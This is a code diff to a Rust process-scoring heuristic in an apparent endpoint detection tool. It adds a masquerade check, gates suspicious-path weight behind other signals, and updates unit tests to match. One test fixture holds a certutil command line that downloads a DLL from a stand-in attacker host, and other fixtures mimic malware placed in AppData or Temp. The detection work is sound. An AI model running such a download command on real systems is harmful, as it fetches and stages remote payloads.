@@ -1,6 +1,7 @@
 //! heur_parentchild (FR10, SRS §10): anomalous parent->child, encoded PowerShell,
 //! suspicious exec path, unsigned + integrity weighting, built-in LOLBAS-flavored list.
 use crate::score::{is_suspicious_path, severity_for, Score};
+use crate::trust::is_masquerade;
 use cairn_core::finding::EntityProcess;
 use cairn_core::record::{ProcessRecord, Record};
 use cairn_core::traits::Analyzer;
@@ -80,6 +81,15 @@ pub(crate) fn score_process(p: &ProcessRecord, parent: Option<&ProcessRecord>) -
     let child_name = file_name(&p.image);
     let parent_name = parent.map(|pp| file_name(&pp.image));
 
+    // S3 masquerade (spec §4.2): a protected system name outside C:\Windows is
+    // dispositive on its own — no clean machine has an AppData svchost.exe.
+    if is_masquerade(&p.image) {
+        s.add(
+            60,
+            format!("system binary name outside C:\\Windows: {}", p.image),
+            &["T1036.005"],
+        );
+    }
     if let Some(pn) = &parent_name {
         if OFFICE_PARENTS.contains(&pn.as_str()) && SHELL_CHILDREN.contains(&child_name.as_str()) {
             s.add(
@@ -104,18 +114,22 @@ pub(crate) fn score_process(p: &ProcessRecord, parent: Option<&ProcessRecord>) -
     if has_encoded_powershell(&child_name, &p.cmdline) {
         s.add(40, "encoded PowerShell command", &["T1059.001"]);
     }
-    if is_suspicious_path(&p.image) {
-        s.add(
-            25,
-            format!("executes from a suspicious path: {}", p.image),
-            &["T1036"],
-        );
-    }
     if LOLBAS_WATCH.contains(&child_name.as_str()) && lolbas_suspicious(&p.cmdline) {
         s.add(
             30,
             format!("LOLBAS {child_name} with suspicious arguments"),
             &["T1218"],
+        );
+    }
+    // Suspicious path is an AMPLIFIER (spec §4.2 S8): alone it matches every
+    // per-user app (chrome-native-host in \AppData\) — zero information. It adds
+    // weight only when a behavioral combo already fired.
+    let combo_fired = !s.reasons.is_empty();
+    if combo_fired && is_suspicious_path(&p.image) {
+        s.add(
+            25,
+            format!("executes from a suspicious path: {}", p.image),
+            &["T1036"],
         );
     }
     // Unsigned amplifier: an unsigned binary is a signal only when ANOTHER suspicion has
@@ -252,14 +266,18 @@ mod tests {
         assert_eq!(s.weight, 0);
     }
 
-    /// Unsigned binary from Temp still scores even with NO parent (self-signals only).
+    /// Unsigned binary from Temp with NO parent and no other behavioral signal: under
+    /// the path-as-amplifier model, suspicious-path no longer fires without a prior
+    /// combo, so the unsigned amplifier (which itself requires a prior signal) also
+    /// stays quiet. Total weight is 0 (renamed from `unsigned_from_temp_no_parent_scores`,
+    /// which asserted this combination scored >= 45 under the old independent-signal model).
     #[test]
-    fn unsigned_from_temp_no_parent_scores() {
+    fn unsigned_temp_alone_gated_out() {
         let mut p = proc(70, 0, r"C:\Users\a\AppData\Local\Temp\evil.exe", "evil.exe");
         p.signed = Some(false);
         let s = score_process(&p, None);
-        // suspicious path (25) + unsigned (20) = 45 -> at least medium, no panic
-        assert!(s.weight >= 45);
+        assert_eq!(s.weight, 0);
+        assert!(s.reasons.is_empty());
     }
 
     /// A watchlisted LOLBAS binary with a suspicious http argument scores the LOLBAS
@@ -317,15 +335,19 @@ mod tests {
         assert!(s2.mitre.contains(&"T1059.001".to_string()));
     }
 
-    /// Unsigned WITH another signal (suspicious path): amplifier fires (+20).
+    /// Suspicious path alone (no prior combo, e.g. LOLBAS) no longer fires under the
+    /// path-as-amplifier model, so the unsigned amplifier chained off it also stays
+    /// quiet: total weight is 0 (renamed from `unsigned_amplifies_with_suspicious_path`,
+    /// which asserted path(25)+unsigned(20)=45 under the old independent-signal model).
+    /// A real combo (LOLBAS) + suspicious path + unsigned IS exercised by
+    /// `unsigned_high_integrity_amplifies_with_signal` below.
     #[test]
-    fn unsigned_amplifies_with_suspicious_path() {
+    fn unsigned_and_path_alone_gated_out() {
         let mut p = proc(10, 0, r"C:\Users\a\AppData\Local\Temp\x.exe", "x.exe");
         p.signed = Some(false);
         let s = score_process(&p, None);
-        // suspicious path 25 + unsigned 20 = 45
-        assert_eq!(s.weight, 45);
-        assert!(s.reasons.iter().any(|r| r.contains("unsigned")));
+        assert_eq!(s.weight, 0);
+        assert!(!s.reasons.iter().any(|r| r.contains("unsigned")));
     }
 
     /// Unsigned ALONE (normal path, no parent/encoded/LOLBAS): amplifier does NOT fire.
@@ -340,24 +362,45 @@ mod tests {
         assert!(!s.reasons.iter().any(|r| r.contains("unsigned")));
     }
 
-    /// Unsigned + high integrity WITH another signal: both unsigned amplifiers fire.
+    /// Unsigned + high integrity WITH a prior behavioral combo (LOLBAS): the combo
+    /// fires first, which unlocks BOTH the path amplifier and the unsigned amplifiers
+    /// chained after it. (Renamed from `unsigned_high_integrity_amplifies_with_signal`:
+    /// the old fixture relied on suspicious-path firing with no prior signal, which the
+    /// path-as-amplifier model no longer allows — see `unsigned_and_path_alone_gated_out`
+    /// for that now-empty case. This test keeps the same intent — "does the unsigned/
+    /// high-integrity chain fire once corroborated?" — using certutil LOLBAS as the
+    /// corroborating combo instead; NOT rundll32, which is also a PROTECTED_SYSTEM_NAME
+    /// and would additionally fire S3 masquerade, inflating the weight.)
     #[test]
     fn unsigned_high_integrity_amplifies_with_signal() {
-        let mut p = proc(12, 0, r"C:\Users\a\AppData\Local\Temp\x.exe", "x.exe");
+        let mut p = proc(
+            12,
+            0,
+            r"C:\Users\a\AppData\Local\Temp\certutil.exe",
+            "certutil.exe http://evil.example/x.dll",
+        );
         p.signed = Some(false);
         p.integrity = Some("high".into());
         let s = score_process(&p, None);
-        // suspicious path 25 + unsigned 20 + unsigned-high-integrity 15 = 60
-        assert_eq!(s.weight, 60);
+        // LOLBAS 30 + suspicious path 25 + unsigned 20 + unsigned-high-integrity 15 = 90
+        assert_eq!(s.weight, 90);
+        assert!(s.reasons.iter().any(|r| r.contains("suspicious path")));
+        assert!(s.reasons.iter().any(|r| r.contains("unsigned")));
     }
 
-    /// Signed (Some(true)) with a suspicious path: no unsigned amplifier.
+    /// Signed (Some(true)) with a suspicious path but no prior combo: suspicious-path
+    /// no longer fires alone (path-as-amplifier model), so weight is 0 and — a
+    /// fortiori — no unsigned amplifier fires either. (Renamed from
+    /// `signed_does_not_amplify`, which asserted the old independent path weight of 25;
+    /// its core intent, "a signed binary never gets the unsigned amplifier," is
+    /// subsumed by `unsigned_high_integrity_amplifies_with_signal`'s signed==Some(false)
+    /// vs the None default used throughout this module's other tests.)
     #[test]
-    fn signed_does_not_amplify() {
+    fn signed_with_suspicious_path_alone_gated_out() {
         let mut p = proc(13, 0, r"C:\Users\a\AppData\Local\Temp\x.exe", "x.exe");
         p.signed = Some(true);
         let s = score_process(&p, None);
-        assert_eq!(s.weight, 25);
+        assert_eq!(s.weight, 0);
         assert!(!s.reasons.iter().any(|r| r.contains("unsigned")));
     }
 
@@ -383,9 +426,12 @@ mod tests {
         assert!(findings.is_empty(), "own PID must never produce a finding");
     }
 
-    /// A different PID at the same suspicious path must still fire.
+    /// A suspicious path alone (no prior behavioral combo) is no longer a finding on
+    /// its own under the path-as-amplifier model — even for a different PID than our
+    /// own. (Renamed from `other_pid_suspicious_path_still_flagged`, which asserted a
+    /// finding fires for suspicious-path-alone under the old independent-signal model.)
     #[test]
-    fn other_pid_suspicious_path_still_flagged() {
+    fn suspicious_path_alone_is_not_a_finding() {
         use std::process;
         let own_pid = process::id();
         let other = Record::Process(proc(
@@ -395,7 +441,10 @@ mod tests {
             "",
         ));
         let findings = ParentChildHeuristic.analyze(&[other]).expect("analyze");
-        assert!(!findings.is_empty(), "other PID at same path must still fire");
+        assert!(
+            findings.is_empty(),
+            "suspicious path alone must not produce a finding"
+        );
     }
 
     // --- R6: human-readable details field ---
@@ -422,21 +471,24 @@ mod tests {
         assert!(!details.contains("image="), "must not use debug key=value format: {details}");
     }
 
-    /// When cmdline is empty, details omit the cmd= field.
+    /// When cmdline is empty, details omit the cmd= field. Uses the S3 masquerade
+    /// signal (dispositive alone) to guarantee a finding without relying on the now-
+    /// gated suspicious-path-alone signal (renamed fixture from a bare Temp path,
+    /// which under the path-as-amplifier model no longer produces a finding on its
+    /// own — see `suspicious_path_alone_is_not_a_finding`).
     #[test]
     fn process_details_no_cmdline_when_empty() {
-        // A suspicious-path process with no cmdline still produces a finding.
         let p = rec(proc(
             400,
             4,
-            r"C:\Users\a\AppData\Local\Temp\evil.exe",
+            r"C:\Users\a\AppData\Roaming\svchost.exe",
             "", // empty cmdline
         ));
         let findings = ParentChildHeuristic.analyze(&[p]).expect("analyze");
-        assert!(!findings.is_empty(), "suspicious path should produce a finding");
+        assert!(!findings.is_empty(), "masquerade signal should produce a finding");
         let details = &findings[0].details;
         assert!(!details.contains("cmd="), "empty cmdline must not produce cmd= field: {details}");
-        assert!(details.contains("evil.exe"), "binary name missing: {details}");
+        assert!(details.contains("svchost.exe"), "binary name missing: {details}");
     }
 
     /// The analyzer emits one Heuristic finding (with reason + entity) for a malicious
@@ -461,5 +513,35 @@ mod tests {
         assert!(f.reason.is_some(), "golden rule 6: reason required");
         assert!(f.entity.process.is_some());
         assert!(f.mitre.contains(&"T1059.001".to_string()));
+    }
+
+    /// S3 masquerade fires alone (dispositive, weight 60) and — because it is itself a
+    /// fired combo signal — also unlocks the suspicious-path amplifier (+25) for the
+    /// same `\AppData\Roaming\` path: 60 + 25 = 85, severity_for(85) = Critical (the
+    /// 70.. band). This proves masquerade needs no OTHER corroborating signal to emit
+    /// a finding, which is the property under test (severity ends up even higher than
+    /// the bare 60 because the path amplifier stacks on top).
+    #[test]
+    fn masquerade_svchost_in_appdata_fires_high_alone() {
+        let p = rec(proc(
+            500,
+            0,
+            r"C:\Users\a\AppData\Roaming\svchost.exe",
+            "",
+        ));
+        let findings = ParentChildHeuristic.analyze(&[p]).expect("analyze");
+        assert_eq!(findings.len(), 1, "masquerade should produce exactly one finding");
+        let f = &findings[0];
+        assert_eq!(f.severity, cairn_core::Severity::Critical);
+        assert!(f.mitre.contains(&"T1036.005".to_string()));
+    }
+
+    /// The real svchost.exe in its legitimate System32 home must never fire the
+    /// masquerade signal.
+    #[test]
+    fn real_svchost_in_system32_does_not_fire() {
+        let p = rec(proc(501, 0, r"C:\Windows\System32\svchost.exe", ""));
+        let findings = ParentChildHeuristic.analyze(&[p]).expect("analyze");
+        assert!(findings.is_empty(), "legitimate svchost.exe must not be flagged");
     }
 }
